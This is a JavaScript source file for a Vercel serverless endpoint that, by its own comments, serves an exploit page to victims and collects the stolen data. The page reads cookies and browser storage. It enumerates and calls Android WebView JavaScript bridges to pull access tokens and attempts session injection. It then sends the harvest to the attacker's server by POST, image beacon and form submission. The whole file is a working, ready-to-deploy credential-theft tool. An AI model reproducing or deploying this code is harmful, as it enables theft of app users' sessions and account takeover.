// api/index.js  —  Vercel Node serverless
// GET  /api        -> serves the exploit HTML to the victim
// POST /api        -> receives exfiltrated data
// GET  /api?log=x  -> beacon fallback (image / GET exfil)
//
// Deployed at: https://haxor-net.vercel.app/api

const HITS = []; // in-memory, per-lambda. Use KV/DB for persistence.

export default async function handler(req, res) {
  // ---------- CORS: allow the WebView origin to POST back ----------
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ---------- EXFIL RECEIVER ----------
  if (req.method === 'POST') {
    let body = '';
    await new Promise((resolve) => {
      req.on('data', (c) => { body += c; if (body.length > 1e6) req.destroy(); });
      req.on('end', resolve);
      req.on('error', resolve);
    });
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], body };
    HITS.push(hit);
    console.log('=== EXFIL HIT ===', JSON.stringify(hit));
    return res.status(200).json({ ok: true });
  }

  // ---------- GET BEACON FALLBACK ----------
  if (req.query && req.query.d) {
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], body: req.query.d };
    HITS.push(hit);
    console.log('=== EXFIL BEACON ===', JSON.stringify(hit));
    // 1x1 transparent gif so <img> works
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7','base64');
    res.setHeader('Content-Type','image/gif');
    return res.status(200).send(gif);
  }

  // ---------- EXPLOIT PAGE ----------
  const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;font-size:12px;padding:12px">
<pre id="o">probing…</pre>
<script>
(function(){
  var OUT=document.getElementById('o');
  var dump={ts:new Date().toISOString(),url:location.href,ua:navigator.userAgent,
            cookie:document.cookie,ls:{},ss:{},bridges:{},probes:{}};
  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);dump.ls[k]=localStorage.getItem(k);}}catch(e){}
  try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);dump.ss[k]=sessionStorage.getItem(k);}}catch(e){}

  function S(v){try{if(v===undefined)return'undef';if(v===null)return'null';
    if(typeof v==='object')return JSON.stringify(v).slice(0,1500);return String(v).slice(0,1500);}catch(e){return'[x]';}}

  // Common Android bridge names
  var NAMES=['action_login','actionLogin','AndroidBridge','Android','AppBridge','app',
    'jsBridge','JsBridge','JSBridge','nativeBridge','NativeBridge','bridge',
    'webviewBridge','WebViewBridge','mwebview','MWebView','mwebviewactivity',
    'hopegaming','msport','splash','splashActivity','appInterface','AppInterface',
    '__native__','__bridge__','_NATIVE_','_bridge','mwebviewBridge','MWebViewActivity'];

  // Enumerate every accessible bridge
  for(var n=0;n<NAMES.length;n++){
    var name=NAMES[n];
    if(!(name in window))continue;
    var b=window[name],o={};
    try{for(var k in b){try{var t=typeof b[k];
      if(t==='function'){try{o[k]={fn:1,ret:S(b[k]())}}catch(e){o[k]={fn:1,err:String(e)}}}
      else o[k]={v:S(b[k])};}catch(e){o[k]={err:String(e)}};}}catch(e){o.__e=String(e)}
    dump.bridges[name]=o;

    // Try common message-passing entrypoints with token-shaped payloads
    var PL=[{handler:'getToken'},{handler:'getUserInfo'},{method:'getToken'},
            {action:'getToken'},{cmd:'token'},{type:'token'},{action:'getUserInfo'}];
    var FNS=['postMessage','invoke','call','send','exec','_handleMessageFromJs','handleMessage','dispatch'];
    for(var f=0;f<FNS.length;f++){var fn=FNS[f];
      if(typeof b[fn]!=='function')continue;
      for(var p=0;p<PL.length;p++){
        try{var r=b[fn](JSON.stringify(PL[p]));
          dump.probes[name+'.'+fn+'('+JSON.stringify(PL[p])+')']=S(r);}
        catch(e){dump.probes[name+'.'+fn+'('+JSON.stringify(PL[p])+')']='ERR:'+String(e);}
      }
    }
  }

  // Explicit session-injection probe against action_login (Android style)
  try{
    if(window.action_login && typeof window.action_login.postMessage==='function'){
      window.action_login.postMessage(JSON.stringify({
        userId:'PROBE_USER',accessToken:'PROBE_AT',refreshToken:'PROBE_RT'
      }));
      dump.probes['action_login.inject']='sent';
    }
  }catch(e){dump.probes['action_login.inject']='ERR:'+String(e);}

  OUT.textContent=JSON.stringify(dump,null,2).slice(0,4000);

  // ---------- exfil: fetch + img beacon + form, belt and braces ----------
  var body=JSON.stringify(dump);
  try{fetch('/api',{method:'POST',mode:'cors',headers:{'Content-Type':'text/plain'},
    body:body,keepalive:true}).catch(function(){});}catch(e){}
  try{(new Image()).src='/api?d='+encodeURIComponent(body.slice(0,1800))+'&_='+Date.now();}catch(e){}
  try{var f=document.createElement('form');f.method='POST';f.action='/api';
    var i=document.createElement('input');i.type='hidden';i.name='d';i.value=body.slice(0,4000);
    f.appendChild(i);document.body.appendChild(f);f.submit();}catch(e){}
})();
</script></body></html>`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).send(html);
}

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  return (xff ? String(xff).split(',')[0] : (req.socket && req.socket.remoteAddress)) || 'unknown';
}
